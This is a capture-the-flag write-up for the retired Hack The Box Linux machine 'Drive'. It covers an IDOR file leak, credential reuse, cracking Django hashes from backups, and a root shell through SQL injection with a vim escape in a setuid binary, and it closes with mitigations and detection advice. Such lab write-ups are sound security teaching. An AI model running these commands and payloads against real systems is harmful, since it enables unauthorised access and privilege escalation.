---
machine: Drive
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, idor, gitea, sqlite, rop, privesc]
---

# Drive — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The DoodleGrive storage platform exposes `/[id]/getFileDetail/` and `/[id]/block/` without checking ownership. An IDOR in `block` reads private files, including credentials for `martin`. From that account Gitea is reachable, and the website repository reveals the password for the `.7z` backups; extracting them yields several user hashes and a password for `tom`. His home contains a setuid binary, `doodleGrive-cli`, with SQL injection in the activate-user option. `edit()` and `VISUAL=vim` execute a root shell; the binary's buffer overflow/ROP is the intended path.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` OpenSSH 8.2p1 Ubuntu 20.04.
- `80` nginx 1.18.0 redirecting to `drive.htb`.
- `3000` is filtered externally; Gitea listens on localhost.

```bash
echo '<IP> drive.htb' | sudo tee -a /etc/hosts
```

The site allows registration and file uploads. The panel uses routes such as `/100/getFileDetail/` and `/100/block/`, and the `csrftoken`/`sessionid` cookies identify Django.

## Enumeration

Register an account and enumerate IDs with `ffuf`, filtering `500`:

```bash
ffuf -u http://drive.htb/FUZZ/getFileDetail/ -w <(seq 1 500) \
  -fc 500 -H 'Cookie: csrftoken=<TOKEN>; sessionid=<SESSION>'
```

IDs `79`, `98`, `99` and `101` return `401`, but `/[id]/block/` displays their content without authorization. File `79` contains `martin`'s credentials; the others describe the edit feature, a daily backup in `/var/www/backups` and security concerns.

## Foothold

`martin`'s credentials work over SSH:

```bash
ssh martin@drive.htb
```

`/var/www/backups` contains several `.7z` files and a readable `db.sqlite3`. `martin`'s Gitea repository (same password as the web account) contains `db_backup.sh`, including the archive password. Extract the backups and compare the `accounts_customuser` tables:

```bash
7z e -o/dev/shm 1_Oct_db_backup.sqlite3.7z -p'<BACKUP_PASSWORD>'
sqlite3 /dev/shm/oct.sqlite3 \
  'select username,password from accounts_customuser;'
```

`tomHands`' Django SHA-1 hashes change between backups. `hashcat -m 124` recovers several passwords; one works over SSH:

```bash
hashcat -m 124 tom_hashes rockyou.txt
ssh tom@drive.htb
```

## Lateral movement

The path is `martin` → `tom` through the leaked database. `tom` keeps SSH access, and his home contains the user flag and the setuid binary.

## Privilege escalation

```bash
ls -l ~/doodleGrive-cli
# -rwsr-x--- root tom
./doodleGrive-cli
```

The binary asks for a username and password and presents a menu. Option 5 builds an activation query from the supplied name. With `VISUAL=/usr/bin/vim`, an injection that calls `edit(username)` opens Vim; from there, `:!/bin/bash` spawns a shell with root's effective UID:

```bash
VISUAL=/usr/bin/vim ./doodleGrive-cli
# valid username and password
# option 5
"&edit(username);-- -
# inside Vim:
:!/bin/bash
```

The intended path is a buffer overflow with a format-string canary leak and ROP to `system("/bin/sh")`; SQLi with `load_extension` is another variant. All three reach root.

## Evidence

- `401` IDs readable through `/[id]/block/`.
- `martin`'s credentials in file `79`.
- `db_backup.sh` containing the `.7z` password.
- Different `tomHands` hashes and a password accepted over SSH.
- `doodleGrive-cli` with the setuid bit and a root shell after `:!/bin/bash`.

## Lessons learned

- An IDOR can hide in a secondary action (`block`) even when the main endpoint checks permissions.
- Backups and Git history retain secrets and older hash versions.
- A setuid program that builds SQL from user input combines two vulnerability classes.
- Unintended paths are worth checking: the binary had SQLi, `load_extension` and an overflow.

## Mitigations and detection

- Check ownership and group membership on every endpoint, not only the main view.
- Do not store backup passwords in repositories; use a secret manager and rotate them.
- Parameterise SQL and do not let input enable `edit()` or `load_extension`.
- Build with canaries, PIE and full RELRO; never install development setuid binaries.
- Detect sequential access to other users' IDs, `.7z` extraction and `vim` spawned from a setuid process.

## References

- [0xdf — Drive](https://0xdf.gitlab.io/2024/02/17/htb-drive.html)
- [IppSec — Drive](https://www.youtube.com/watch?v=HM8_Pf8zxko)
- [Hack The Box — Drive](https://app.hackthebox.com/machines/drive)
